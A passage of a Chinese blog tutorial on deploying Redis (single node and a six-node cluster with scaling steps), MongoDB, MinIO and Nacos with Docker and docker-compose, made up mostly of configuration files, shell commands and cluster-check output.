class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 提前准备好redis.conf文件，创建好相应的文件夹。如：</span></span><br><span class="line">port 6379</span><br><span class="line"><span class="comment"># 开启redis数据持久化,可选</span></span><br><span class="line">appendonly yes</span><br><span class="line"><span class="comment"># 开启redis验证,可选 </span></span><br><span class="line">requirepass 123</span><br><span class="line"><span class="comment">#注释掉,允许redis外地连接 </span></span><br><span class="line"><span class="comment"># bind 127.0.0.1</span></span><br><span class="line"><span class="comment">#将daemonize yes注释起来或者 daemonize no设置，因为该配置和docker run中-d参数冲突，会导致容器一直启动失败 </span></span><br><span class="line">daemonize no </span><br><span class="line"></span><br><span class="line"><span class="comment">#更多配置参照 https://raw.githubusercontent.com/redis/redis/6.0/redis.conf</span></span><br><span class="line">docker run  -p 6379:6379 --name redis \</span><br><span class="line">--privileged=<span class="literal">true</span> \</span><br><span class="line">-v /usr/<span class="built_in">local</span>/redis/redis.conf:/etc/redis/redis.conf \</span><br><span class="line">-v /usr/<span class="built_in">local</span>/redis/data:/data -d redis:6.0.8 \</span><br><span class="line">redis-server /etc/redis/redis.conf  --appendonly yes</span><br></pre></td></tr></table></figure><p>docker-compose部署</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">'3'</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">redis:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">redis:6.2.5</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">redis</span></span><br><span class="line">    <span class="attr">privileged:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">../redis/data:/data</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">../redis/conf/redis.conf:/usr/local/etc/redis/redis.conf</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">../redis/logs:/logs</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">["redis-server","/usr/local/etc/redis/redis.conf"]</span></span><br><span class="line">    <span class="attr">privileged:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">6379</span><span class="string">:6379</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">TZ="Asia/Shanghai"</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br></pre></td></tr></table></figure><h3 id="4-2-集群安装">4.2 集群安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># port：节点端口；</span></span><br><span class="line"><span class="comment"># requirepass：设置密码，访问时需要验证</span></span><br><span class="line"><span class="comment"># protected-mode：保护模式，默认值 yes，即开启。开启保护模式以后，需配置 bind ip 或者设置访问密码；关闭保护模式，外部网络可以直接访问；</span></span><br><span class="line"><span class="comment"># daemonize：是否以守护线程的方式启动（后台启动），默认 no；</span></span><br><span class="line"><span class="comment"># appendonly：是否开启 AOF 持久化模式，默认 no；</span></span><br><span class="line"><span class="comment"># cluster-enabled：是否开启集群模式，默认 no；</span></span><br><span class="line"><span class="comment"># cluster-config-file：集群节点信息文件；</span></span><br><span class="line"><span class="comment"># cluster-node-timeout：集群节点连接超时时间；</span></span><br><span class="line"><span class="comment"># cluster-announce-ip：集群节点 IP</span></span><br><span class="line"><span class="comment"># 注意： 如果你想要你的redis集群可以供外网访问，这里直接填 服务器的IP 地址即可;如若为了安全，只是在服务器内部进行访问，这里还需要做一些修改。</span></span><br><span class="line"><span class="comment"># cluster-announce-port：集群节点映射端口；</span></span><br><span class="line"><span class="comment"># cluster-announce-bus-port：集群节点总线端口</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#shell脚本循环生成配置文件</span></span><br><span class="line"><span class="keyword">for</span> port <span class="keyword">in</span> $(seq 1 6);\</span><br><span class="line"><span class="keyword">do</span> \</span><br><span class="line">mkdir -p /mydata/redis/node-<span class="variable">$&#123;port&#125;</span>/conf</span><br><span class="line">touch /mydata/redis/node-<span class="variable">$&#123;port&#125;</span>/conf/redis.conf</span><br><span class="line">cat &lt;&lt;EOF&gt;&gt;/mydata/redis/node-<span class="variable">$&#123;port&#125;</span>/conf/redis.conf</span><br><span class="line">port 6379</span><br><span class="line"><span class="built_in">bind</span> 0.0.0.0</span><br><span class="line">cluster-enabled yes</span><br><span class="line">cluster-config-file nodes.conf</span><br><span class="line">cluster-node-timeout 5000</span><br><span class="line">cluster-announce-ip 172.38.0.1<span class="variable">$&#123;port&#125;</span></span><br><span class="line">cluster-announce-port 6379</span><br><span class="line">cluster-announce-bus-port 16379</span><br><span class="line">appendonly yes</span><br><span class="line">EOF</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 首先创建自定义网络</span></span><br><span class="line">docker network create --driver bridge --subnet 172.38.0.0/24 --gateway 172.38.0.1 redis</span><br><span class="line"><span class="comment">#分别启动docker容器，shell脚本，注意配置文件的生成</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $(seq 1 6);\</span><br><span class="line"><span class="keyword">do</span> \</span><br><span class="line">docker run -p 637<span class="variable">$&#123;i&#125;</span>:6379 -p 1637<span class="variable">$&#123;i&#125;</span>:16379 \</span><br><span class="line">--name redis-<span class="variable">$&#123;i&#125;</span> --privileged=<span class="literal">true</span> \</span><br><span class="line">-v /mydata/redis/node-<span class="variable">$&#123;i&#125;</span>/data:/data \</span><br><span class="line">-v /mydata/redis/node-<span class="variable">$&#123;i&#125;</span>/conf/redis.conf:/etc/redis/redis.conf \</span><br><span class="line">-d --net redis --ip 172.38.0.1<span class="variable">$&#123;i&#125;</span> redis \</span><br><span class="line">redis-server /etc/redis/redis.conf</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 随机进入一个容器</span></span><br><span class="line">docker <span class="built_in">exec</span> -it redis-1 /bin/bash</span><br><span class="line"><span class="comment"># 生成集群，--cluster-replicas 1 表示为每个master创建一个slave节点 </span></span><br><span class="line">redis-cli --cluster create 172.38.0.11:6379 172.38.0.12:6379 172.38.0.13:6379 172.38.0.14:6379 172.38.0.15:6379 172.38.0.16:6379 --cluster-replicas 1   </span><br><span class="line"><span class="comment"># 进入客户端</span></span><br><span class="line">redis-cli -p 6379</span><br><span class="line"><span class="comment"># 查看集群结点状况</span></span><br><span class="line">cluster nodes</span><br><span class="line"><span class="comment"># 查看集群信息</span></span><br><span class="line">cluster info</span><br><span class="line"><span class="comment"># 需要进入集群模式，否则会报错</span></span><br><span class="line">redis-cli -p 6379 -c</span><br><span class="line"><span class="comment"># 集群会自动计算哈希槽存储位置，若主节点宕机，从节点会成为主节点</span></span><br><span class="line">127.0.0.1:6379&gt; <span class="built_in">set</span> a b</span><br><span class="line">-&gt; Redirected to slot [15495] located at 172.38.0.13:6379</span><br><span class="line">OK</span><br></pre></td></tr></table></figure><h3 id="4-3-主从扩容">4.3 主从扩容</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1、新建6377、6378两个节点+新建后启动+查看是否8节点,注意配置文件的创建</span></span><br><span class="line">docker run -p 6377:6379 -p 16377:16379 --name redis-7 --privileged=<span class="literal">true</span> -v /mydata/redis/node-7/data:/data -v /mydata/redis/node-7/conf/redis.conf:/etc/redis/redis.conf -d --net redis --ip 172.38.0.17 redis redis-server /etc/redis/redis.conf</span><br><span class="line">docker run -p 6378:6379 -p 16378:16379 --name redis-8 --privileged=<span class="literal">true</span> -v /mydata/redis/node-8/data:/data -v /mydata/redis/node-8/conf/redis.conf:/etc/redis/redis.conf -d --net redis --ip 172.38.0.18 redis redis-server /etc/redis/redis.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2、进入6377容器实例内部</span></span><br><span class="line">docker <span class="built_in">exec</span> -it redis-7 /bin/bash</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3、将新增的6377节点(空槽号)作为master节点加入原集群</span></span><br><span class="line"><span class="comment"># redis-cli --cluster  add-node  自己实际IP地址:6377  自己实际IP地址:6371 </span></span><br><span class="line"><span class="comment"># 6377 就是将要作为master新增节点 </span></span><br><span class="line"><span class="comment"># 6371 就是原来集群节点里面的领路人，相当于6377找到组织加入集群</span></span><br><span class="line"><span class="comment"># 这里我直接使用了内部网络</span></span><br><span class="line">redis-cli --cluster add-node 172.38.0.17:6379 172.38.0.11:6379 </span><br><span class="line"></span><br><span class="line"><span class="comment"># 4、检查集群情况第1次</span></span><br><span class="line">redis-cli --cluster check  172.38.0.11:6379</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5、重新分派槽号</span></span><br><span class="line">redis-cli --cluster reshard 172.38.0.11:6379</span><br><span class="line"></span><br><span class="line"><span class="comment"># 因为4台，16384/4=4096，每台分4分之一</span></span><br><span class="line">How many slots <span class="keyword">do</span> you want to move (from 1 to 16384)? 4096</span><br><span class="line"><span class="comment"># 172.38.0.17:6379 的id</span></span><br><span class="line">What is the receiving node ID? 3a732104b11d3cf81d1128def9f0158fb5708ca7</span><br><span class="line"><span class="comment"># 输入 all</span></span><br><span class="line">Source node <span class="comment">#1: all</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 6、检查集群情况第2次</span></span><br><span class="line">redis-cli --cluster check  172.38.0.11:6379</span><br><span class="line">172.38.0.11:6379 (9c109831...) -&gt; 0 keys | 4096 slots | 1 slaves.</span><br><span class="line">172.38.0.12:6379 (0100361c...) -&gt; 0 keys | 4096 slots | 1 slaves.</span><br><span class="line">172.38.0.13:6379 (348dc3b1...) -&gt; 0 keys | 4096 slots | 1 slaves.</span><br><span class="line">172.38.0.17:6379 (5d34f842...) -&gt; 0 keys | 4096 slots | 0 slaves.</span><br><span class="line">[OK] 0 keys <span class="keyword">in</span> 4 masters.</span><br><span class="line">0.00 keys per slot on average.</span><br><span class="line">&gt;&gt;&gt; Performing Cluster Check (using node 172.38.0.11:6379)</span><br><span class="line">M: 9c109831a0afd33f7c13500caf39d3191a13e0b3 172.38.0.11:6379</span><br><span class="line">   slots:[1365-5460] (4096 slots) master</span><br><span class="line">   1 additional replica(s)</span><br><span class="line">M: 0100361c6056686b671f84877af18ffd22b4c428 172.38.0.12:6379</span><br><span class="line">   slots:[6827-10922] (4096 slots) master</span><br><span class="line">   1 additional replica(s)</span><br><span class="line">M: 348dc3b13714d0b07236c2ba6c5147f270b08800 172.38.0.13:6379</span><br><span class="line">   slots:[12288-16383] (4096 slots) master</span><br><span class="line">   1 additional replica(s)</span><br><span class="line">S: 6fc86fc554f1f939564e6acc346da222a886ab6a 172.38.0.14:6379</span><br><span class="line">   slots: (0 slots) slave</span><br><span class="line">   replicates 348dc3b13714d0b07236c2ba6c5147f270b08800</span><br><span class="line">S: 2a2fe251d41085ec7eb53e9bf4e4c749e5d9dbb9 172.38.0.15:6379</span><br><span class="line">   slots: (0 slots) slave</span><br><span class="line">   replicates 9c109831a0afd33f7c13500caf39d3191a13e0b3</span><br><span class="line">M: 5d34f8422f8b68ea87bd2f8388c686fdbcfdc9a1 172.38.0.17:6379</span><br><span class="line">   slots:[0-1364],[5461-6826],[10923-12287] (4096 slots) master</span><br><span class="line">S: 9068998c9b5cd5e4cca939738cc42a2954770b47 172.38.0.16:6379</span><br><span class="line">   slots: (0 slots) slave</span><br><span class="line">   replicates 0100361c6056686b671f84877af18ffd22b4c428</span><br><span class="line">[OK] All nodes agree about slots configuration.</span><br><span class="line">&gt;&gt;&gt; Check <span class="keyword">for</span> open slots...</span><br><span class="line">&gt;&gt;&gt; Check slots coverage...</span><br><span class="line">[OK] All 16384 slots covered.</span><br><span class="line"></span><br><span class="line"><span class="comment">## 为什么172.38.0.17是3个新的区间，以前的还是连续？</span></span><br><span class="line"><span class="comment">## 重新分配成本太高，所以前3家各自匀出来一部分，从三个旧节点分别匀出1364个坑位给新节点172.38.0.17 </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 7、为主节点172.38.0.17分配从节点172.38.0.18</span></span><br><span class="line"><span class="comment"># redis-cli  --cluster add-node  ip:新slave端口 ip:新master端口 --cluster-slave --cluster-master-id 新主机节点ID</span></span><br><span class="line">redis-cli --cluster add-node 172.38.0.18:6379 172.38.0.17:6379 --cluster-slave --cluster-master-id 3a732104b11d3cf81d1128def9f0158fb5708ca7 </span><br><span class="line"></span><br><span class="line"><span class="comment"># 8、检查集群情况第3次</span></span><br><span class="line">redis-cli --cluster check 172.38.0.18:6379</span><br></pre></td></tr></table></figure><h3 id="4-4-主从缩容">4.4 主从缩容</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1、将172.38.0.17和172.38.0.18下线</span></span><br><span class="line"><span class="comment"># 2、检查集群情况 获得172.38.0.18的从节点ID</span></span><br><span class="line">redis-cli --cluster check 172.38.0.11:6379</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3、将172.38.0.18从节点删除 从集群中将4号从节点172.38.0.18删除</span></span><br><span class="line"><span class="comment"># redis-cli --cluster  del-node  ip:从机端口 从机6388节点ID</span></span><br><span class="line">redis-cli --cluster del-node 172.38.0.18:6379 bdf8a5114bbad6d400aa8b1a5e3f29b174d6676e</span><br><span class="line"><span class="comment">## 检查一下发现只剩下7台机器了</span></span><br><span class="line">redis-cli --cluster check 172.38.0.11:6379</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4、将172.38.0.17的槽号清空，重新分配，本例将清出来的槽号都给172.38.0.11</span></span><br><span class="line">redis-cli --cluster reshard 172.38.0.11:6379</span><br><span class="line"></span><br><span class="line">How many slots <span class="keyword">do</span> you want to move (from 1 to 16384)?4096</span><br><span class="line"><span class="comment"># 172.38.0.11的id</span></span><br><span class="line">What is the receiving node ID? edf165b5d01f1a1f276237517d391c86c32d9f93</span><br><span class="line"><span class="comment"># 172.38.0.17的id</span></span><br><span class="line">Source node <span class="comment">#1: 3a732104b11d3cf81d1128def9f0158fb5708ca7</span></span><br><span class="line">Source node <span class="comment">#2: done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 5、检查集群情况第二次</span></span><br><span class="line">redis-cli --cluster check 172.38.0.11:6379</span><br><span class="line"><span class="comment"># 4096个槽位都指给172.38.0.11，它变成了8192个槽位，相当于全部都给172.38.0.11了，不然要输入3次，一锅端 </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 6、将172.38.0.17删除</span></span><br><span class="line"><span class="comment"># redis-cli --cluster del-node ip:端口 172.38.0.17节点ID</span></span><br><span class="line">redis-cli --cluster del-node 172.38.0.17:6379 3a732104b11d3cf81d1128def9f0158fb5708ca7</span><br><span class="line"></span><br><span class="line"><span class="comment"># 7、检查集群情况第三次</span></span><br><span class="line">redis-cli --cluster check 172.38.0.11:6379</span><br></pre></td></tr></table></figure><h2 id="5、MongoDB安装">5、MongoDB安装</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">'3'</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">mongo:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">mongo:5.0.9</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">mongo</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">27017</span><span class="string">:27017</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/etc/localtime:/etc/localtime</span> <span class="comment">#时区</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">../mongodb/data/db:/data/db</span>  <span class="comment">#数据</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">../mongodb/log:/var/log/mongodb</span>  <span class="comment"># 挂载日志目录</span></span><br><span class="line">    <span class="comment">#  - ./config:/etc/mongo #配置目录</span></span><br><span class="line">    <span class="attr">privileged:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="attr">MONGO_INITDB_ROOT_USERNAME:</span> <span class="string">root</span></span><br><span class="line">      <span class="attr">MONGO_INITDB_ROOT_PASSWORD:</span> <span class="string">root</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">mongo-express:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">mongo-express:0.54</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">mongo-express</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">8079</span><span class="string">:8081</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="attr">ME_CONFIG_MONGODB_ADMINUSERNAME:</span> <span class="string">root</span></span><br><span class="line">      <span class="attr">ME_CONFIG_MONGODB_ADMINPASSWORD:</span> <span class="string">root</span></span><br><span class="line">      <span class="attr">ME_CONFIG_MONGODB_URL:</span> <span class="string">mongodb://root:root@mongo:27017/</span></span><br></pre></td></tr></table></figure><p>添加管理员</p><ul><li>数据库用户角色：read、readWrite;</li><li>数据库管理角色：dbAdmin、dbOwner、userAdmin；</li><li>集群管理角色：clusterAdmin、clusterManager、clusterMonitor、hostManager；</li><li>备份恢复角色：backup、restore；</li><li>所有数据库角色：readAnyDatabase、readWriteAnyDatabase、userAdminAnyDatabase、dbAdminAnyDatabase</li><li>超级用户角色：root</li><li>系统超级用户的访问（dbOwner 、userAdmin、userAdminAnyDatabase）</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 登录并切换db到admin</span></span><br><span class="line">$ docker <span class="built_in">exec</span> -it mongo mongo admin</span><br><span class="line"></span><br><span class="line"><span class="comment"># 登录root用户,如果前面没有创建root用户可跳过此步</span></span><br><span class="line">&gt; db.auth(<span class="string">'root'</span>,<span class="string">'123456'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建所有数据库管理用户 admin/123456</span></span><br><span class="line">&gt; db.createUser(&#123;user:<span class="string">'admin'</span>,<span class="built_in">pwd</span>: <span class="string">'123456'</span>,roles:[&#123;role:<span class="string">"userAdminAnyDatabase"</span>, db:<span class="string">"admin"</span>&#125;, <span class="string">"readWriteAnyDatabase"</span>]&#125;);</span><br><span class="line"><span class="comment"># Successfully added user: &#123; ...</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用新用户登录，返回 0=失败 1=成功</span></span><br><span class="line">&gt; db.auth(<span class="string">'admin'</span>, <span class="string">'123456'</span>)</span><br><span class="line"><span class="comment"># 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建测试库</span></span><br><span class="line">&gt; use testdb</span><br><span class="line"><span class="comment"># 插入测试数据</span></span><br><span class="line">&gt; db.testdb.insert(&#123;<span class="string">"name"</span>:<span class="string">"testdb"</span>&#125;)</span><br><span class="line"><span class="comment"># 创建用户并授权，dbOwner代表数据库所有者角色，拥有最高该数据库最高权限。</span></span><br><span class="line">&gt; db.createUser(&#123; user:<span class="string">"user_testdb"</span>, <span class="built_in">pwd</span>:<span class="string">"123456"</span>, roles: [&#123; role:<span class="string">"readWrite"</span>, db:<span class="string">"testdb"</span> &#125;] &#125;)</span><br><span class="line">&gt; </span><br><span class="line"><span class="comment"># 退出数据库</span></span><br><span class="line">&gt; <span class="built_in">exit</span></span><br></pre></td></tr></table></figure><h2 id="6、MiniO安装">6、MiniO安装</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">'3'</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">minio:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">minio/minio:RELEASE.2022-03-26T06-49-28Z</span></span><br><span class="line">    <span class="attr">hostname:</span> <span class="string">"minio"</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">"9000:9000"</span> <span class="comment"># api 端口</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">"9001:9001"</span> <span class="comment"># 控制台端口</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="attr">MINIO_ACCESS_KEY:</span> <span class="string">root</span>    <span class="comment">#管理后台用户名</span></span><br><span class="line">      <span class="attr">MINIO_SECRET_KEY:</span> <span class="string">rootroot</span> <span class="comment">#管理后台密码，最小8个字符</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">../minio/data:/data</span>               <span class="comment">#映射当前目录下的data目录至容器内/data目录</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">../minio/config:/root/.minio/</span>     <span class="comment">#映射配置目录</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">server</span> <span class="string">--console-address</span> <span class="string">':9001'</span> <span class="string">/data</span>  <span class="comment">#指定容器中的目录 /data</span></span><br><span class="line">    <span class="attr">privileged:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">logging:</span></span><br><span class="line">      <span class="attr">options:</span></span><br><span class="line">        <span class="attr">max-size:</span> <span class="string">"50M"</span> <span class="comment"># 最大文件上传限制</span></span><br><span class="line">        <span class="attr">max-file:</span> <span class="string">"10"</span></span><br><span class="line">      <span class="attr">driver:</span> <span class="string">json-file</span></span><br></pre></td></tr></table></figure><h2 id="7、Nacos安装">7、Nacos安装</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 外置数据库</span></span><br><span class="line"><span class="attr">version:</span> <span class="string">"3"</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">nacos:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">nacos/nacos-server:$&#123;NACOS_VERSION&#125;</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">nacos-standalone-mysql</span></span><br><span class="line">    <span class="attr">env_file:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">../nacos/nacos-standlone-mysql.env</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">../nacos/standalone-logs/:/home/nacos/logs</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">../nacos/init.d/custom.properties:/home/nacos/init.d/custom.properties</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">"8848:8848"</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">"9848:9848"</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">"9555:9555"</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br></pre></td></tr></table></figure><p>设置配置文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 同级目录下的.env</span></span><br><span class="line">NACOS_VERSION=v2.0.4</span><br><span class="line"></span><br><span class="line"><span class="comment"># ../nacos/nacos-standlone-mysql.env</span></span><br><span class="line">PREFER_HOST_MODE=hostname</span><br><span class="line">MODE=standalone</span><br><span class="line">SPRING_DATASOURCE_PLATFORM=mysql</span><br><span 